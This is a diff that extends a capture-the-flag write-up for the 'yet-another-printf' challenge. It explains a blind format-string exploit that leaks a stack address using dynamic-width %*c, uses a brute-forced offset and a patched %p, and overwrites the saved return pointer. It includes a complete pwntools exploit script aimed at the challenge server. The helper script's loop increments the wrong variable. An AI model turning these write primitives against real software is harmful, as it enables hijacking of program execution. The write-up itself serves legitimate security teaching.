@@ -406,3 +406,155 @@ pwndbg>
 We did redirect code execution! Sadly this was not enough for the challenge since the exploit has to work 5 times in succession and given the low probability of correctly hitting the stack address of the saved return pointer, I was not able to get a 5/5 during the ctf.
 
 ## A better exploit
+
+Remember the problem we had? We could not predict the stack address of the saved return pointer even with the static offset! It would be nice if we could just *leak* some stack address to then utilize the static offset. Remember, we do not get output. There is one saving grace however:
+
+## Dynamic width
+
+We already made use of the width argument when printing many chars. What I did not consider was, that instead of a static width supplied by the programmer, fprintf can also use a dynamic width via `%*c`. Fprintf will then take whatever is on the stack and interpret that as a *signed* 4 byte int (on this arch) and pad the output to that many chars. Combined with an index specifier, this essentially allows us to read from an address that we supply. We can "read" the result by using "%n" to write the number of chars printed so far.
+
+Addresses are 8 Bytes long. Fprintf will then read the lower 4 bytes of such an address and interpret it as a signed int which is perfect since we are only interested in the lower 2 bytes.
+
+## Calculating stack addresses blindly
+
+With this knowledge we can do something much smarter then in the previous exploit. Essentially we want to calculate `addr_saved_rip = val_reg2 - 4104`. The first step would be to know `val_reg2`. Well, now we can!
+
+We just need to specify a dynamic width with the value of `reg2` as an argument. This will read it as a 4 byte signed int. At this point, we have printed as many chars as the int value of the lower 4 bytes of reg2 is.
+
+Now we still need to subtract 4104 from that. How do we do that? We can only increase the char count by printing more, and not decrease it! The good thing is, that the char counter is a 4 byte value but we are only concerned with the last two bytes. *This means, that we can just print more chars to eventually wrap around the last two bytes, triggering the second most significant byte to increase by one and thus allowing us to set the lower 2 bytes to a specific value.*
+
+Before we find the value to add to get the desired lower two bytes: We cannot use indexing like `%520$*c` here because once fprintf arrives at and indexed specifier, it copies all arguments to a local buffer for later lookups. Since we need to write to our arguments again (and more importantly read our own arguments later), we cannot use indexing here since it would lead to later on reading old values. We circumvent the indexing by just writing 520 times `%c`
+and then `%*c`. This way, we reach the 521st stack offset (`reg2`) without indexing. We have to take into account that we now already printed 520 chars.
+
+Lets write a small python script that calculates (or better, bruteforces) the value `X` that we have to add so that 
+`(reg2_val + 520 + X ) & 0xffff == addr_saved_rip & 0xffff`. For testing we can generate a random stack address and subtract 4104 to generate the corresponding target stack address. Notice that the 4 byte signed int representation of the `reg2_val` *has to be positive*, otherwise `%*c` will read
+the wrong value.
+
+```python
+from os import urandom
+import struct
+
+def gen_pair():
+    while True:
+        addr = urandom(8)
+        int_rep_8 = struct.unpack('>q',addr)[0]
+        int_rep_4 = struct.unpack('>i',addr[-4:])[0]
+        
+        if int_rep_4 >= 0: #!
+            target = struct.pack('>q',int_rep_8 - 4104)
+            target = int_rep_8 - 4104
+
+            return int_rep_8,target
+
+reg2_val,addr_saved_rip = gen_pair()
+
+print(f'{reg2_val = },{addr_saved_rip = }')
+
+X = 0
+while True:
+
+    if (reg2_val + 520 + X) & 0xffff == addr_saved_rip & 0xffff:
+        print(f'{X = }')
+        break
+    c+=1
+```
+
+Running this multiple times we always get `X = 60912`. So when we now
+
+1. write 520 chars to reach `reg2`
+2. read the value of `reg2` via dynamic width
+3. write 60912 chars
+
+the char counter in fprintf should equal the lower 4 bytes of the value of the saved return address!
+Lets try it out. We run the binary in a randomized gdb session, make sure that the value of reg2 is positive. We can then enter 
+520 `%c`'s followed by `%*c%60912c%519$hn`. Upon examining the stack before the return of fprintf when running with the now quite long input we see the following:
+
+![](img/stackptr_ch_aslr.png)
+
+Great! Notice the wild addresses? We were able to point `reg2` to the correct address with the method described above despite having a randomized stack. (Keep in mind that the 4 byte value of `reg2` was positive in this example.)
+
+
+## Abusing %p
+
+In the whole exploit we did not use `%p` yet. Finally, we can put it to use. It essentially allows us to read the last byte of and address. It is exactly what we need here. We currently have the situation that we printed an unknown number of chars and would like to again, get `0x71` into the last byte of the saved return pointer. How can we possibly calculate a value that does this? `%p` to the rescue! The exact number of bytes written so far equals the value of `reg2`. By reading the last byte of it 255 times, we can essentially set the char counter = 0 mod 256 because `x + 255 * c = 0 mod 256` if `c` is the lest significant byte of `x`. One important detail of the modified `%p` is that it dereferences its argument before interpreting it as a char. So to get the last byte of `reg2`, we need to specify the stack offset of `reg1`, which is 520.
+
+After that, we just need to print `0x71` bytes again to set the last byte of the char counter correctly. For this, we can add 255 `'%520$p'`'s for reading the last byte of `reg2`, followed by a final `%520$hhn`, writing to the saved `rip`. Putting it all together looks like this:
+
+```python
+from pwn import *
+'''
+offsets | thing | points to
+519     | reg0  | reg1
+520     | reg1  | reg2
+521     | reg2  | last 16 bytes of code
+'''
+
+def exploit():
+    # works only if int(lower 4 bytes of value of reg2) is positive
+
+    # reach reg2, read lower 4 byte value via dynamic width
+    payload = '%c'*520
+    payload += '%*c'
+
+    # we now know the value int(last 4 bytes of value of reg2) + 520
+    # this means we know a stack addr. The distance to the stack addr
+    # that holds the return addr is static. We have to go down 4104
+    # bytes from the value in reg2 to reach the saved return ptr.
+    # since only the last two bytes matter for that, lets add a magic value
+    # so that (520+lower_4_bytes_reg2_val+MAGIC) & 0xFFFF == stack_addr_of_ret & 0xFF
+    # => works bc addresses only differ in last two bytes
+
+    # add magic number to forge to correct value & 0xffff
+    payload += '%60912c'
+
+    # now we have the correct number in printf counter. Overwrite
+    # value of reg2. Abuse %n behavior, we deref two times, taking
+    # pointer to pointer. Overwrite 2 bytes.
+    payload += '%519$hn'
+
+    # Now we need to write the static offset of success() which is 0x71
+    # to the last byte of the ret ptr. Lets clear the last byte of the
+    # printf counter so that printf counter & 0xFF is 0. Since the 
+    # bytes printed so far equals the last 4 bytes of the current
+    # reg2 value, read its lowest byte 255 times. Abuse behavior of
+    # patched %p, dereferencing and printing as many X as int val of
+    # last byte 
+    payload += '%520$p' * 255
+
+    # since printf counter & 0xFF = 0, get 0x71 into there,
+    # which is the offset of success()
+    payload += f'%{0x71}c'
+
+    # write via %n to reg1, causing:
+    # reg1->reg2->retptr. Overwrite one byte
+    payload += '%520$hhn'
+
+    assert len(payload) <= 4096
+    return payload
+
+def main(id):
+    con = remote(f'{id}-yet-another-printf.challenge.master.cscg.live',ssl=True,port=31337)
+    con.recvuntil(b':')
+    con.send((exploit()+'\n').encode())
+    c = 0
+    while True:
+        l = con.recvline()
+        if b'SUCCESS' in l:
+            c += 1
+        else:
+            print(f'{c} / 5 worked')
+            break
+
+        if c == 5:
+            con.interactive()
+        
+
+while True:
+    main('6a03680ec8b48722a3a12049')
+```
+
+Lets run it against the challenge server:
+
+![](/img/offen.png)
+
+And we got it! After approximately 30 seconds the exploit executes 5 times in a row.
